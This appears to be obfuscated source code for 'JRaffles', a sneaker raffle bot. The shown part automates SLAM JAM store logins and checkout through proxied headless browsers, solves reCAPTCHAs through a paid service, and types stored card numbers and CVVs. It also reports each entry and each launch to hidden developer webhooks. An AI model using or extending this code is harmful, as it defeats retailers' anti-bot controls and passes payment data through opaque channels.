                            _0x22ecfb == 'yes' && _0x11f165 >= 0x5 && (_0x29ff38(_0x27769b[_0x3822c3], _0x8ce722), _0x22ecfb = 'no', _0x11f165 = 0x0), console['log']('Waiting\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0xfb0a48, _0x59c45b, _0xae9d09) {
                    _0x3dd4ff['use'](_0x191e47()), _0x3dd4ff['use'](_0x48a614({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x196f8e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x35d995 = 0x0; _0x35d995 < _0x59c45b['length']; _0x35d995++) {
                        var _0x15912a;
                        if (_0x31d8df != 'yes')
                            var _0x31d8df = '', _0x1252f4 = 0x0;
                        _0x3feae7(_0xfb0a48['name'] + '\x20Task\x20' + (_0x35d995 + 0x1) + '\x20/\x20' + _0x59c45b['length'] + '\x20||\x20File:\x20' + _0x147e1b + '\x20Proxies:\x20' + _0x3f5f24), await _0x2e3034(_0x59c45b, _0x35d995);
                        if (_0x59c45b[_0x35d995]['Email'] == '' || _0x59c45b[_0x35d995]['Password'] == '' || _0x59c45b[_0x35d995]['FirstName'] == '' || _0x59c45b[_0x35d995]['LastName'] == '') {
                            console['log'](_0x508dba() + '\x20[' + _0xfb0a48['name'] + ']\x20Task\x20' + (_0x35d995 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x196f8e['useRandomProxy'] = ![])
                            var _0x521e10 = _0xae9d09[_0x35d995]['split'](':');
                        else
                            var _0x1785bc = Math['round'](Math['random']() * (_0xae9d09['length'] - 0x1)), _0x521e10 = _0xae9d09[_0x1785bc]['split'](':');
                        const _0x5603ad = await _0x3dd4ff['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x521e10[0x0] + ':' + _0x521e10[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox',
                                '--disable-web-security',
                                '--disable-features=IsolateOrigins',
                                '\x20--disable-site-isolation-trials'
                            ]
                        });
                        try {
                            const _0x50e991 = await _0x5603ad['newPage']();
                            await _0x50e991['authenticate']({
                                'username': '' + _0x521e10[0x2],
                                'password': '' + _0x521e10[0x3]
                            }), await _0x50e991['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x508dba() + '\x20[' + _0xfb0a48['name'] + ']\x20Task\x20' + (_0x35d995 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x50e991['setRequestInterception'](!![]), _0x50e991['on']('request', _0x1aafa6 => {
                                _0x1aafa6['resourceType']() === 'image' || _0x1aafa6['resourceType']() === 'font' || _0x1aafa6['resourceType']() === 'media' ? _0x1aafa6['abort']() : _0x1aafa6['continue']();
                            }), await _0x50e991['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x50e991['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x50e991['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x54262e(0x258), await _0x50e991['waitForSelector']('#CustomerEmail'), console['log'](_0x508dba() + '\x20[' + _0xfb0a48['name'] + ']\x20Task\x20' + (_0x35d995 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x50e991['type']('#CustomerEmail', '' + _0x59c45b[_0x35d995]['Email']), await _0x54262e(0x12c), await _0x50e991['type']('#CustomerPassword', '' + _0x59c45b[_0x35d995]['Password']), await _0x54262e(0x226), await _0x50e991['$eval']('#customer_login', _0x47d6d9 => _0x47d6d9['submit']()), await _0x54262e(0x7d0), await _0x50e991['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x508dba() + '\x20[' + _0xfb0a48['name'] + ']\x20Task\x20' + (_0x35d995 + 0x1) + '\x20:\x20' + _0x351e10['cyan']('Solving\x20Captcha')), await _0x50e991['solveRecaptchas'](), console['log'](_0x508dba() + '\x20[' + _0xfb0a48['name'] + ']\x20Task\x20' + (_0x35d995 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x50e991['$eval']('.shopify-challenge__container\x20>\x20form', _0x11d40d => _0x11d40d['submit']());
                            try {
                                await _0x50e991['waitForSelector']('.nav-account'), await _0x54262e(0x4b0);
                            } catch {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0xfb0a48['name'] + ']\x20Task\x20' + (_0x35d995 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x50e991['goto']('' + _0x59c45b[_0x35d995]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x54262e(0xbb8), console['log'](_0x508dba() + '\x20[' + _0xfb0a48['name'] + ']\x20Task\x20' + (_0x35d995 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x50e991['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x50e991['click']('.product-select-variant-wrapper'), await _0x54262e(0x320), await _0x50e991['click']('li.product-select-variant__value[data-size=\x22' + _0x59c45b[_0x35d995]['Size'] + '\x22]'), await _0x54262e(0x384), await _0x50e991['$eval']('#AddToCartForm-product-template-raffle', _0x145b3e => _0x145b3e['submit']()), await _0x50e991['waitForSelector']('.cart-order-summary__content'), await _0x54262e(0x514), await _0x50e991['goto']('https://drop.slamjam.com/checkout'), await _0x54262e(0x514), await _0x50e991['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x508dba() + '\x20[' + _0xfb0a48['name'] + ']\x20Task\x20' + (_0x35d995 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x50e991['select']('#checkout_shipping_address_country', '' + _0x59c45b[_0x35d995]['Country']), await _0x54262e(0x200), await _0x50e991['waitForSelector']('#checkout_shipping_address_first_name'), await _0x50e991['type']('#checkout_shipping_address_first_name', '' + _0x59c45b[_0x35d995]['FirstName']), await _0x54262e(0x237), await _0x50e991['type']('#checkout_shipping_address_last_name', '' + _0x59c45b[_0x35d995]['LastName']), await _0x54262e(0x1e0), await _0x50e991['type']('#checkout_shipping_address_address1', _0x59c45b[_0x35d995]['Address1'] + '\x20' + _0x59c45b[_0x35d995]['HouseNumber']), await _0x54262e(0x514), await _0x50e991['type']('#checkout_shipping_address_address2', '' + _0x59c45b[_0x35d995]['Address2']), await _0x54262e(0x514);
                            _0x59c45b[_0x35d995]['Postcode'] == undefined && (_0x59c45b[_0x35d995]['Postcode'] = _0x59c45b[_0x35d995]['Zip']);
                            await _0x50e991['type']('#checkout_shipping_address_zip', '' + _0x59c45b[_0x35d995]['Postcode']), await _0x54262e(0x2bc), await _0x50e991['type']('#checkout_shipping_address_city', '' + _0x59c45b[_0x35d995]['City']), await _0x54262e(0x320), await _0x50e991['type']('#checkout_shipping_address_phone', '' + _0x59c45b[_0x35d995]['Phone']), await _0x54262e(0x320), await _0x50e991['click']('#continue_button'), await _0x54262e(0xbb8), await _0x50e991['waitForSelector']('.summary-title'), await _0x54262e(0x320), await _0x50e991['click']('#continue_button'), await _0x54262e(0x320), console['log'](_0x508dba() + '\x20[' + _0xfb0a48['name'] + ']\x20Task\x20' + (_0x35d995 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x50e991['waitForSelector']('#checkout_credit_card_vault'), await _0x54262e(0x3e8);
                            var _0x43e26b = await _0x50e991['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x4f3cb7 = await _0x43e26b['contentFrame']();
                            await _0x4f3cb7['click']('#number'), await _0x54262e(0x3e8), await _0x4f3cb7['type']('#number', '' + _0x59c45b[_0x35d995]['CardNumber'], { 'delay': 0x78 }), _0x43e26b = await _0x50e991['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x4f3cb7 = await _0x43e26b['contentFrame'](), await _0x54262e(0x1c2), await _0x4f3cb7['click']('#name'), await _0x54262e(0x1f4), await _0x4f3cb7['type']('#name', '' + _0x59c45b[_0x35d995]['NameOnCard'], { 'delay': 0x78 }), _0x43e26b = await _0x50e991['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x4f3cb7 = await _0x43e26b['contentFrame'](), await _0x54262e(0x1c2), await _0x4f3cb7['click']('#expiry'), await _0x54262e(0x1f4), await _0x4f3cb7['type']('#expiry', '' + _0x59c45b[_0x35d995]['ExpiryDate'], { 'delay': 0x78 }), _0x43e26b = await _0x50e991['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x4f3cb7 = await _0x43e26b['contentFrame'](), await _0x54262e(0x1c2), await _0x4f3cb7['click']('#verification_value'), await _0x54262e(0x1f4), await _0x4f3cb7['type']('#verification_value', '' + _0x59c45b[_0x35d995]['CVV'], { 'delay': 0x78 }), await _0x50e991['$eval']('#accepts-flag-raffle', _0x4821fa => _0x4821fa['click']()), await _0x54262e(0x7d0), console['log'](_0x508dba() + '\x20[' + _0xfb0a48['name'] + ']\x20Task\x20' + (_0x35d995 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x50e991['$eval']('#continue_button', _0x13d8a4 => _0x13d8a4['click']()), await _0x54262e(0x1b58), await _0x50e991['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x50e991['$eval']('.edit_checkout.animate-floating-labels', _0x47888b => _0x47888b['submit']()), await _0x54262e(0x7d0);
                            try {
                                await _0x50e991['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x31d8df = 'no', _0x3444cf(_0x59c45b[_0x35d995], _0xfb0a48), console['log'](_0x351e10['green'](_0x508dba() + '\x20[' + _0xfb0a48['name'] + ']\x20Task\x20' + (_0x35d995 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x2a7765) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x2a7765['message']);
                            }
                            var _0x5d423f = await _0x107feb(_0x59c45b[_0x35d995], _0xfb0a48, 'dev', ![]), _0x42035d = await _0x107feb(_0x59c45b[_0x35d995], _0xfb0a48, 'pub', ![]);
                            const _0x2fa444 = {
                                'succesDEVMSG': { 'embeds': [_0x5d423f] },
                                'succesPUBMSG': { 'embeds': [_0x42035d] }
                            };
                            try {
                                _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], _0x2fa444['succesDEVMSG']), await _0x54262e(0xc8), await _0x459a7f(_0x26f37d, _0x2fa444['succesDEVMSG']), await _0x54262e(0xc8), await _0x459a7f(_0xf106b7, _0x2fa444['succesPUBMSG']);
                            } catch (_0x3315e1) {
                                console['log'](_0x351e10['yellow'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0x35d995 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x3315e1));
                            }
                        } catch (_0x1602cc) {
                            console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0x34a60a[taskModule]['name'] + ']\x20Task\x20' + (_0x35d995 + 0x1) + '\x20:\x20' + _0x1602cc)), _0x15912a = '' + _0x1602cc;
                            var _0x3e16b3 = await _0x107feb(kickz[_0x35d995], _0xfb0a48, 'dev', !![], _0x15912a);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x3e16b3] }, _0x196f8e['webhook'] != undefined && _0x196f8e['webhook'] != '' && await _0x459a7f(_0x196f8e['webhook'], EMBEDS['errorDEV']), await _0x459a7f(_0x491127, EMBEDS['errorDEV']), _0x31d8df = 'yes';
                        } finally {
                            _0x5603ad && _0x5603ad['close']();
                            if (_0x31d8df == 'yes' && _0x1252f4 != 0x5 && _0x15912a != 'Size\x20Not\x20Found') {
                                console['log'](_0x351e10['red'](_0x508dba() + '\x20[' + _0xfb0a48['name'] + ']\x20Task\x20' + (_0x35d995 + 0x1) + '\x20:\x20Retrying')), _0x35d995 = _0x35d995 - 0x1, _0x1252f4 = _0x1252f4 + 0x1;
                                continue;
                            }
                            _0x31d8df == 'yes' && _0x1252f4 >= 0x5 && (_0x29ff38(_0x59c45b[_0x35d995], _0xfb0a48), _0x31d8df = 'no', _0x1252f4 = 0x0), console['log']('Waiting\x20for\x20' + _0x196f8e['delay'] + '\x20ms'), await _0x54262e(_0x196f8e['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0xdc28c5) {
                    var _0x4e5b6e = await _0x5268ba(), _0x25018c = _0x3a2baa['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x5d251a = _0x4b2684['parse'](_0x25018c, { 'header': !![] })['data'];
                    for (var _0x5a0234 = 0x0; _0x5a0234 < _0x5d251a['length']; _0x5a0234++) {
                        var _0xa29ff2 = _0x5d251a[_0x5a0234]['Store'], _0x512712 = _0x5d251a[_0x5a0234]['Mode'];
                        for (var _0xa2f8c4 of _0x34a60a) {
                            const _0x53dea0 = _0xa2f8c4['name']['includes'](_0xa29ff2);
                            if (!_0x53dea0)
                                continue;
                            for (mode of _0xa2f8c4['modules']) {
                                if (mode['name'] == _0x512712) {
                                    console['log']('Running\x20' + _0x351e10['cyan'](mode['name'])), await mode['function'](mode, [_0x5d251a[_0x5a0234]], _0x4e5b6e);
                                    var _0x5b045a = _0x25018c['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x3a2baa['writeFileSync']('../failed-tasks.csv', _0x5b045a);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x4f50f8 = await _0x525726['get']('Answer');
                    if (_0x4f50f8['Answer']['toLowerCase']() == 'y') {
                        _0x3a2baa['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x54262e(0x3e8);
                        return;
                    }
                    if (_0x4f50f8['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x54262e(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x54262e(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x18d943(_0x2c979a) {
    var _0x563a13 = await _0x5268ba(), _0x5a082b = _0x3a2baa['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x23f03c = _0x4b2684['parse'](_0x5a082b, { 'header': !![] })['data'];
    for (var _0x398296 = 0x0; _0x398296 < _0x23f03c['length']; _0x398296++) {
        var _0x227754 = _0x23f03c[_0x398296]['Store'], _0x1926ec = _0x23f03c[_0x398296]['Mode'];
        for (var _0x1dcf26 of _0x34a60a) {
            const _0xbb1941 = _0x1dcf26['name']['includes'](_0x227754);
            if (_0xbb1941)
                for (mode of _0x34a60a[_0x1dcf26]['modules']) {
                    const _0x5bf3fc = mode['name']['includes'](_0x1926ec);
                    _0x5bf3fc && (_0x2c979a = mode['name'], await mode['function'](_0x2c979a, _0x23f03c[_0x398296], _0x563a13));
                }
        }
    }
}
async function _0x42b756() {
    await _0x3f380f(), console['clear']();
    if (_0x5c71b0 != 'devkey') {
        let _0x44460f = await _0x4440f0['autoUpdate']();
        if (_0x44460f === 'yes')
            return _0xad0d56('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x4c7610 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x54262e(0x2710);
        ;
    }
    await _0x77551f(_0x4c7610);
    if (_0xeb1e3 === ![])
        return console['log']('Closing\x20Browser'), await _0x54262e(0xbb8);
    else
        try {
            var _0x408786 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x2ccb52
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x5c71b0
                    }
                ]
            }];
            const _0x52a7cf = { 'embeds': _0x408786 };
            var _0x1b37da = await _0x107feb(null, null, 'open', ![]);
            const _0x206b0f = { 'openDEVMSG': { 'embeds': [_0x1b37da] } };
            await _0x459a7f(_0x45c490, _0x206b0f['openDEVMSG']);
            async function _0x3875a0() {
                _0x3feae7('JRaffles\x20' + _0x5c71b0), console['clear'](), console['log']('Welcome\x20to\x20' + _0x351e10['cyan']('JRaffles();') + '\x20' + _0x5c71b0), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0xb5e46e = 0x0; _0xb5e46e < _0x34a60a['length'] - 0x4; _0xb5e46e++) {
                    if (_0xb5e46e >= 0xa) {
                        console['log']('\x20(' + _0xb5e46e + ')\x20[' + _0x34a60a[_0xb5e46e]['name'] + ']');
                        continue;
                    }
                    if (_0x34a60a[_0xb5e46e]['name'] === 'Reload\x20Settings' || _0x34a60a[_0xb5e46e]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0xb5e46e + ')\x20\x20[' + _0x34a60a[_0xb5e46e]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x34a60a['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x34a60a['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x34a60a['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x34a60a['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2d5dd7();
                if (taskModule > _0x34a60a['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x54262e(0x3e8), _0x3875a0();
                if (_0x34a60a[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x449936(_0x34a60a[taskModule]['modules']);
                    var _0x2e49ae = _0x34a60a[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x428198 = await _0x5268ba(), _0x550e51 = await _0x39b490();
                        _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x550e51), await _0x2e49ae['function'](_0x2e49ae, _0x550e51, _0x428198);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x428198 = await _0x5268ba(), _0x550e51 = await _0x39b490();
                            _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x550e51), await _0x2e49ae['function'](_0x2e49ae, _0x550e51, _0x428198);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x428198 = await _0x5268ba();
                                await _0x2e49ae['function'](_0x2e49ae, _0x428198);
                            }
                        }
                    }
                    return _0x3875a0();
                }
                if (_0x34a60a[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x449936(_0x34a60a[taskModule]['modules']);
                        var _0x2e49ae = _0x34a60a[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x428198 = await _0x5268ba(), _0x36acad = await _0x39b490();
                            _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x36acad), await _0x2e49ae['function'](_0x2e49ae, _0x36acad, _0x428198);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x428198 = await _0x5268ba(), _0x36acad = await _0x39b490();
                                _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x36acad), await _0x2e49ae['function'](_0x2e49ae, _0x36acad, _0x428198);
                            }
                        }
                    } catch (_0x2b6a89) {
                        console['log'](_0x2b6a89), await _0x54262e(0xfa0);
                    }
                    return _0x3875a0();
                }
                if (_0x34a60a[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x449936(_0x34a60a[taskModule]['modules']);
                    var _0x2e49ae = _0x34a60a[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x428198 = await _0x5268ba();
                        return await _0x2e49ae['function'](_0x2e49ae, _0x428198), _0x3875a0();
                    }
                    var _0x428198 = await _0x5268ba(), _0x239e20 = await _0x39b490();
                    return _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x239e20), await _0x2e49ae['function'](_0x2e49ae, _0x239e20, _0x428198), _0x3875a0();
                }
                if (_0x34a60a[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x449936(_0x34a60a[taskModule]['modules']);
                    var _0x2e49ae = _0x34a60a[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x428198 = await _0x5268ba(), _0x239e20 = await _0x39b490();
                    return _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x239e20), await _0x2e49ae['function'](_0x2e49ae, _0x239e20, _0x428198), _0x3875a0();
                }
                if (_0x34a60a[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x449936(_0x34a60a[taskModule]['modules']);
                    var _0x2e49ae = _0x34a60a[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x428198 = await _0x5268ba(), _0x239e20 = await _0x39b490();
                    return _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x239e20), await _0x2e49ae['function'](_0x2e49ae, _0x239e20, _0x428198), _0x3875a0();
                } else {
                    if (_0x34a60a[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x449936(_0x34a60a[taskModule]['modules']);
                        var _0x2e49ae = _0x34a60a[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x428198 = await _0x5268ba(), _0x4cd027 = await _0x39b490();
                            return _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x4cd027), await _0x2e49ae['function'](_0x2e49ae, _0x4cd027, _0x428198), _0x3875a0();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x428198 = await _0x5268ba();
                                return await _0x2e49ae['function'](_0x2e49ae, null, _0x428198), _0x3875a0();
                            }
                        }
                        ;
                    } else {
                        if (_0x34a60a[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x449936(_0x34a60a[taskModule]['modules']);
                            var _0x2e49ae = _0x34a60a[taskModule]['modules'][taskFunction], _0x428198 = await _0x5268ba(), _0x6d8712 = await _0x39b490();
                            return _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x6d8712), await _0x2e49ae['function'](_0x2e49ae, _0x6d8712, _0x428198), await _0x54262e(0x1388), _0x3875a0();
                        } else {
                            if (_0x34a60a[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x449936(_0x34a60a[taskModule]['modules']);
                                var _0x2e49ae = _0x34a60a[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x428198 = await _0x5268ba(), _0x4cd027 = await _0x39b490();
                                    return _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x4cd027), await _0x2e49ae['function'](_0x2e49ae, _0x4cd027, _0x428198), _0x3875a0();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x428198 = await _0x5268ba();
                                        return await _0x2e49ae['function'](_0x2e49ae, null, _0x428198), _0x3875a0();
                                    }
                                }
                                ;
                            } else {
                                if (_0x34a60a[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x449936(_0x34a60a[taskModule]['modules']);
                                    var _0x2e49ae = _0x34a60a[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x4585f7('https://bouncewear.com/nl/account/register', _0x2e49ae);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x34a60a[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x449936(_0x34a60a[taskModule]['modules']);
                                        var _0x2e49ae = _0x34a60a[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x428198 = await _0x5268ba(), _0x29701d = await _0x39b490();
                                            return _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x29701d), await _0x2e49ae['function'](_0x2e49ae, _0x29701d, _0x428198), _0x3875a0();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x428198 = await _0x5268ba(), _0x29701d = await _0x39b490();
                                                return _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x29701d), await _0x2e49ae['function'](_0x2e49ae, _0x29701d, _0x428198), _0x3875a0();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x34a60a[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x449936(_0x34a60a[taskModule]['modules']);
                                            var _0x2e49ae = _0x34a60a[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x428198 = await _0x5268ba(), _0x14ad29 = await _0x39b490();
                                                return _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x14ad29), await _0x2e49ae['function'](_0x2e49ae, _0x14ad29, _0x428198), _0x3875a0();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x428198 = await _0x5268ba(), _0x14ad29 = await _0x39b490();
                                                    return _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x14ad29), await _0x2e49ae['function'](_0x2e49ae, _0x14ad29, _0x428198), _0x3875a0();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x34a60a[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x449936(_0x34a60a[taskModule]['modules']);
                                                var _0x2e49ae = _0x34a60a[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x428198 = await _0x5268ba(), _0x3d12a7 = await _0x39b490();
                                                    return _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x3d12a7), await _0x2e49ae['function'](_0x2e49ae, _0x3d12a7, _0x428198), _0x3875a0();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x428198 = await _0x5268ba(), _0x3d12a7 = await _0x39b490();
                                                        return _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x3d12a7), await _0x2e49ae['function'](_0x2e49ae, _0x3d12a7, _0x428198), _0x3875a0();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x34a60a[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x449936(_0x34a60a[taskModule]['modules']);
                                                    var _0x2e49ae = _0x34a60a[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x428198 = await _0x5268ba(), _0x57cd0a = await _0x39b490();
                                                        return _0x196f8e['shuffleTasks'] && await _0x28de7d(_0x57cd0a), await _0x2e49ae['function'](_0x2e49ae, _0x57cd0a, _0x428198), _0x3875a0();
                                                    }
                                                } else {
                                                    if (_0x34a60a[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x54262e(0x3e8), _0x3875a0();
                                                    else {
                                                        if (_0x34a60a[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x591040 = _0x34a60a[taskModule]['name'], _0x428198 = await _0x5268ba();
                                                            return await _0x226ea2(_0x591040, _0x428198), _0x3875a0();
                                                        } else {
                                                            if (_0x34a60a[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x449936(_0x34a60a[taskModule]['modules']);
                                                                var _0x2e49ae = _0x34a60a[taskModule]['modules'][taskFunction];
                                                                return await _0x2e49ae['function'](_0x2e49ae), _0x3875a0();
                                                            } else {
                                                                if (_0x34a60a[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x1b1484 = 0x0;
                                                                    for (const _0x482495 in _0x196f8e) {
                                                                        console['log']('(' + _0x1b1484 + ')\x20' + _0x482495 + '\x20:\x20' + _0x196f8e[_0x482495]), _0x1b1484++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x1b1484 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x4c7479 = await _0xadb7fe();
                                                                    if (_0x4c7479 == _0x1b1484)
                                                                        return _0x3875a0();
                                                                    console['clear'];
                                                                    var _0x1ac811 = 0x0;
                                                                    for (var _0x6ab765 in _0x196f8e) {
                                                                        if (_0x4c7479 == _0x1ac811) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x6ab765 + '\x20:'), _0x196f8e[_0x6ab765] = await _0x47aa97(), _0x3a2baa['writeFileSync']('../settings.json', JSON['stringify'](_0x196f8e));
                                                                            break;
                                                                        } else
                                                                            _0x1ac811++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x54262e(0xbb8), _0x3875a0();
                                                                } else {
                                                                    if (_0x34a60a[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x3f380f(), _0x3875a0();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x34a60a[0x45] = { 'name': 'AFEW\x20SECRET' };
